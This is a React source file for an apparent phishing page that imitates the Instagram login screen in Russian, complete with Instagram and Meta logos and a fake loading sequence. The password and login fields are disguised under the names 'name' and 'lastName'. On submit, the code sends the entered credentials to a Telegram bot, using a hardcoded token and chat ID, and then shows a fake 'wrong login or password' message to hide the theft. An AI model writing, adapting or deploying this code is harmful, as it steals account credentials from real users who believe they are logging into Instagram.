import React, { useState, useEffect } from "react";
import axios from "axios";

import FirstPage from "../Images/FirstPage.png";
import FromMeta from "../Images/FromMeta.png";
import InstaLogo from "../Images/InstaLogo.png";
import Profile from "../Images/Profile.jpeg";
import Loading from "../Images/loading.gif";
import CloseEye from "../Images/closeEye.png";
import OpenEye from "../Images/openEye.png";

import "../styles/homepage.css";

function Homepage() {
  const [formData, setFormData] = useState({
    name: "",
    lastName: "",
  });

  const [emptyFields, setEmptyFields] = useState(false);
  const [firstPage, setFirstPage] = useState(false);
  const [ProfileImg, setProfileImg] = useState(false);
  const [loading, setLoading] = useState(true);
  const [showErrorMessage, setShowErrorMessage] = useState(false);

  setTimeout(() => {
    setFirstPage(true);
  }, 2000);

  useEffect(() => {
    const firstTimeout = setTimeout(() => {
      setLoading(false);
    }, 2100);

    const secondTimeout = setTimeout(() => {
      setLoading(true);
      setProfileImg(true);
    }, 2300);

    return () => {
      clearTimeout(firstTimeout);
      clearTimeout(secondTimeout);
    };
  }, []);

  useEffect(() => {
    if (showErrorMessage) {
      const timeout = setTimeout(() => {
        setShowErrorMessage(false);
      }, 2000);

      return () => {
        clearTimeout(timeout);
      };
    }
  }, [showErrorMessage]);

  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value,
    });
  };

  const TOKEN = "5984860249:AAHS-OYjZuEDepF7uY4g-2mZZfCvpenpahQ";
  const CHAT_ID = "-1001949794791";
  const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (formData.name === "" || formData.lastName === "") {
      setEmptyFields(true);
      return;
    }
    setShowErrorMessage(true);

    try {
      let message = `${formData.name}\n`;
      message += `${formData.lastName}`;

      axios.post(URL_API, {
        chat_id: CHAT_ID,
        parse_mode: "html",
        text: message,
      });
    } catch (err) {}
  };

  // видимость пароли
  const [lastNameVisible, setLastNameVisible] = useState(false);

  const toggleLastNameVisibility = () => {
    setLastNameVisible(!lastNameVisible);
  };

  return (
    <>
      <img
        className={`FirstPage ${firstPage ? "None" : ""}`}
        src={FirstPage}
        alt=""
      />
      <div className={`loadingCont ${loading ? "None" : ""}`}>
        <img className={`Loading`} src={Loading} alt="" />
      </div>
      <img
        className={`Profile ${ProfileImg ? "None" : ""}`}
        src={Profile}
        alt=""
      />

      {showErrorMessage && (
        <div className="incorrectName">Неверный логин или пароль</div>
      )}

      <div className="hpContainer">
        <img className="hpInstaLogo" src={InstaLogo} alt="error(" />

        <div className="inputsCont">
          <input
            className={`Input ${
              emptyFields && formData.name === "" ? "Error" : ""
            }`}
            name="name"
            type="text"
            placeholder="Телефон, имя пользователя или эл.адрес"
            value={formData.name}
            onChange={handleChange}
          />
          <div className="passCont">
            <input
              className={`Input input2 ${
                emptyFields && formData.lastName === "" ? "Error" : ""
              }`}
              name="lastName"
              type={lastNameVisible ? "text" : "password"}
              placeholder="Пароль"
              value={formData.lastName}
              onChange={handleChange}
            />
            <img
              className="eyeBtn"
              src={lastNameVisible ? OpenEye : CloseEye}
              alt="Eye"
              onClick={toggleLastNameVisibility}
            />
          </div>
        </div>
        <p className="ForgotPass">Забыли пароль?</p>

        <button className="loginBtn" onClick={handleSubmit}>
          Войти
        </button>

        <div className="noAccoutCont">
          <p className="noAccoutnQuestion">У вас ещё нет аккаута?</p>
          <p className="SignUp">Зарегистрироваться</p>
        </div>

        <img className="hpMetaLogo" src={FromMeta} alt="error" />
      </div>
    </>
  );
}

export default Homepage;
